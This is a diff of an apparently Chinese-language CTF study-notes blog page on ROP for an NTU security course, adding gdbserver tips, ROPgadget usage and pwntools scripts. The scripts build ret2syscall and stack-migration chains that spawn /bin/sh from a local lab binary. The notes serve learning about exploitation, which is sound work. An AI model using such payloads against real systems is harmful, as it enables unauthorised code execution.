@@ -24,17 +24,19 @@
 
   <meta name="description" content="week4 shellcode rop">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ntu_stcs_2016_w4">
+<meta property="og:title" content="NTU STCS 2016学习笔记 0x02 ROP">
 <meta property="og:url" content="http://dojokuro.xyz/2020/08/25/ntu-stcs-2016-w4/index.html">
 <meta property="og:site_name" content="DojoKuro&#39;s Blog">
 <meta property="og:description" content="week4 shellcode rop">
 <meta property="og:locale">
+<meta property="og:image" content="http://dojokuro.xyz/2020/08/25/ntu-stcs-2016-w4/w4-long-gadget.png">
 <meta property="article:published_time" content="2020-08-25T08:46:26.000Z">
-<meta property="article:modified_time" content="2020-08-26T07:07:22.186Z">
+<meta property="article:modified_time" content="2020-08-28T02:02:35.818Z">
 <meta property="article:author" content="DojoKuro">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://dojokuro.xyz/2020/08/25/ntu-stcs-2016-w4/w4-long-gadget.png">
 
 
 <link rel="canonical" href="http://dojokuro.xyz/2020/08/25/ntu-stcs-2016-w4/">
@@ -50,7 +52,7 @@
   };
 </script>
 
-  <title>ntu_stcs_2016_w4 | DojoKuro's Blog</title>
+  <title>NTU STCS 2016学习笔记 0x02 ROP | DojoKuro's Blog</title>
   
 
 
@@ -177,7 +179,7 @@
 
       <!--noindex-->
       <section class="post-toc-wrap sidebar-panel">
-          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#gdbserver"><span class="nav-number">1.</span> <span class="nav-text">gdbserver</span></a></li></ol></div>
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#gdbserver"><span class="nav-number">1.</span> <span class="nav-text">gdbserver</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rop"><span class="nav-number">2.</span> <span class="nav-text">rop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#rop2syscall"><span class="nav-number">2.1.</span> <span class="nav-text">rop2syscall</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E8%BE%83%E9%95%BF%E7%9A%84gadget"><span class="nav-number">2.2.</span> <span class="nav-text">使用较长的gadget</span></a></li></ol></li></ol></div>
       </section>
       <!--/noindex-->
 
@@ -266,7 +268,7 @@
     
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          ntu_stcs_2016_w4
+          NTU STCS 2016学习笔记 0x02 ROP
         </h1>
 
         <div class="post-meta">
@@ -283,7 +285,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-08-26 15:07:22" itemprop="dateModified" datetime="2020-08-26T15:07:22+08:00">2020-08-26</time>
+                <time title="Modified: 2020-08-28 10:02:35" itemprop="dateModified" datetime="2020-08-28T10:02:35+08:00">2020-08-28</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -296,7 +298,7 @@
             </span>
 
           
-            <span id="/2020/08/25/ntu-stcs-2016-w4/" class="post-meta-item leancloud_visitors" data-flag-title="ntu_stcs_2016_w4" title="Views">
+            <span id="/2020/08/25/ntu-stcs-2016-w4/" class="post-meta-item leancloud_visitors" data-flag-title="NTU STCS 2016学习笔记 0x02 ROP" title="Views">
               <span class="post-meta-item-icon">
                 <i class="far fa-eye"></i>
               </span>
@@ -328,11 +330,50 @@
         <p><strong>week4 shellcode rop</strong></p>
 <a id="more"></a>
 
-<h2 id="gdbserver"><a href="#gdbserver" class="headerlink" title="gdbserver"></a>gdbserver</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># in bash commandline</span></span><br><span class="line">gdbserver 127.0.0.1:4000 ./binary <span class="comment">#break在entrypoint</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># in gdb commandline</span></span><br><span class="line">gdb ./binary</span><br><span class="line">$ target remote 127.0.0.1:4000</span><br><span class="line">$ <span class="built_in">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搭配ncat</span></span><br><span class="line">ncat -vc <span class="string">&#x27;gdbserver 127.0.0.1:4000 .binary&#x27;</span> -kl 127.0.0.1 5000</span><br></pre></td></tr></table></figure>
+<h2 id="gdbserver"><a href="#gdbserver" class="headerlink" title="gdbserver"></a>gdbserver</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># in bash commandline</span></span><br><span class="line">gdbserver 127.0.0.1:4000 ./binary <span class="comment">#break在entrypoint</span></span><br><span class="line"><span class="comment"># in gdb commandline</span></span><br><span class="line">gdb ./binary</span><br><span class="line">$ target remote 127.0.0.1:4000</span><br><span class="line">$ <span class="built_in">continue</span></span><br><span class="line"><span class="comment"># 搭配ncat</span></span><br><span class="line">ncat -vc <span class="string">&#x27;gdbserver 127.0.0.1:4000 .binary&#x27;</span> -kl 127.0.0.1 5000</span><br></pre></td></tr></table></figure>
 
 <p><strong>trick</strong><br>使用gdbscript attach pid</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .gdbinit</span></span><br><span class="line"><span class="built_in">set</span> disassembly-flavor intel</span><br><span class="line">define at</span><br><span class="line">  shell <span class="built_in">echo</span> attach $(pidof -s <span class="variable">$arg0</span>) &gt; /tmp/foo.gdb</span><br><span class="line">  <span class="built_in">source</span> /tmp/foo.gdb</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
 
+<hr>
+<h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p>类型包括:ret2syscall ret2fuction ret2libc</p>
+<h3 id="rop2syscall"><a href="#rop2syscall" class="headerlink" title="rop2syscall"></a>rop2syscall</h3><ul>
+<li>找gadget控制syscall需要的regs(eax,ebx,ecx,edx)</li>
+<li>需要int 80</li>
+</ul>
+<p><strong>RopGadget</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#usage</span></span><br><span class="line">RopGadget --binary ./binary</span><br><span class="line"><span class="comment">#int 80 ; ret</span></span><br><span class="line">RopGadget --binary ./binary --opcode cd80c3</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>PS:execve需要’/bin/sh’，且地址必须已知<br>用read吧需要的字符串输入至已知地址的buffer上</p>
+</blockquote>
+<p>找可写page用于read(0,buf_addr,len)中的buf_addr<br>一般用bss最后一页即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/`pidof binary`/maps</span><br><span class="line">readelf -a binary | less <span class="comment"># 看Section Headers中的.bss</span></span><br></pre></td></tr></table></figure>
+
+<p>eg.</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        Opcode Table
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./p1&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./p1&#x27;</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">pop_eax_ret = g(<span class="string">&#x27;pop eax ; ret&#x27;</span>) <span class="comment"># 0x080b8126</span></span><br><span class="line">pop_ebx_ret = g(<span class="string">&#x27;pop ebx ; ret&#x27;</span>) <span class="comment"># 0x080481c9</span></span><br><span class="line">pop_ecx_ret = g(<span class="string">&#x27;pop ecx ; ret&#x27;</span>) <span class="comment"># 0x080de849</span></span><br><span class="line">pop_edx_ret = g(<span class="string">&#x27;pop edx ; ret&#x27;</span>) <span class="comment"># 0x0806edca</span></span><br><span class="line">int_0x80_ret = g(<span class="string">&#x27;int 0x80 ; ret&#x27;</span>)</span><br><span class="line">buf = <span class="number">0x080eb000</span> - <span class="number">100</span></span><br><span class="line">raw_input(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">offset = <span class="number">62</span></span><br><span class="line"><span class="comment"># read(0, &#x27;/bin/sh\x00&#x27;, 100)</span></span><br><span class="line">rop1 = [</span><br><span class="line">  pop_eax_ret,</span><br><span class="line">  <span class="number">3</span>,</span><br><span class="line">  pop_ebx_ret,</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  pop_ecx_ret,</span><br><span class="line">  buf,</span><br><span class="line">  pop_edx_ret,</span><br><span class="line">  <span class="number">100</span>,</span><br><span class="line">  int_0x80_ret,</span><br><span class="line">]</span><br><span class="line"><span class="comment"># execve(&#x27;/bin/sh\x00&#x27;, 0, 0)</span></span><br><span class="line">rop2 = [</span><br><span class="line">  pop_eax_ret,</span><br><span class="line">  <span class="number">0xb</span>,</span><br><span class="line">  pop_ebx_ret,</span><br><span class="line">  buf,</span><br><span class="line">  pop_ecx_ret,</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  pop_edx_ret,</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  int_0x80_ret</span><br><span class="line">]</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * offset + <span class="string">&#x27;&#x27;</span>.join(map(p32, rop1)) + <span class="string">&#x27;&#x27;</span>.join(map(p32, rop2))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+</div>
+
+<h3 id="使用较长的gadget"><a href="#使用较长的gadget" class="headerlink" title="使用较长的gadget"></a>使用较长的gadget</h3><p><img src="w4-long-gadget.png" alt="long gadget"></p>
+<p><strong>leave指令</strong></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#<span class="keyword">leave</span></span><br><span class="line"><span class="keyword">mov</span>   <span class="built_in">esp</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">pop</span>   <span class="built_in">ebp</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Trick: Stack Migration</strong></p>
+<ul>
+<li>使用leave把栈放到已知位置</li>
+<li>确定rop chain的位置时可以直接附加其他data</li>
+<li>可以无限rop</li>
+<li>migrate后的空间要足够</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">gadget1 = <span class="number">0x8048898</span></span><br><span class="line"><span class="comment"># gadget1 has gets() and leave_ret</span></span><br><span class="line"><span class="comment"># 8048898:       50                      push   eax</span></span><br><span class="line"><span class="comment"># 8048899:       e8 e2 69 00 00          call   804f280 &lt;_IO_gets&gt;</span></span><br><span class="line"><span class="comment"># 804889e:       83 c4 10                add    esp,0x10</span></span><br><span class="line"><span class="comment"># 80488a1:       90                      nop</span></span><br><span class="line"><span class="comment"># 80488a2:       c9                      leave</span></span><br><span class="line"><span class="comment"># 80488a3:       c3                      ret</span></span><br><span class="line">migration = [</span><br><span class="line">    pop_ebp_ret,</span><br><span class="line">    buf - <span class="number">4</span>,  <span class="comment">#leave会pop ebp，所以要控制到buf-4位置</span></span><br><span class="line">    pop_eax_ret,</span><br><span class="line">    buf,</span><br><span class="line">    gadget1,</span><br><span class="line">]</span><br><span class="line">rop = [</span><br><span class="line">    pop_eax_ret,</span><br><span class="line">    <span class="number">0xb</span>,</span><br><span class="line">    pop_ebx_ret,</span><br><span class="line">    buf + <span class="number">9</span> * <span class="number">4</span>,  <span class="comment">#ropchain一共有9*4bytes</span></span><br><span class="line">    pop_ecx_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_edx_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    int_0x80_ret</span><br><span class="line">]</span><br><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span> * offset + <span class="string">&#x27;&#x27;</span>.join(map(p32, migration))</span><br><span class="line">payload2 = <span class="string">&#x27;&#x27;</span>.join(map(p32, rop)) + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br></pre></td></tr></table></figure>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
     </div>
 
     
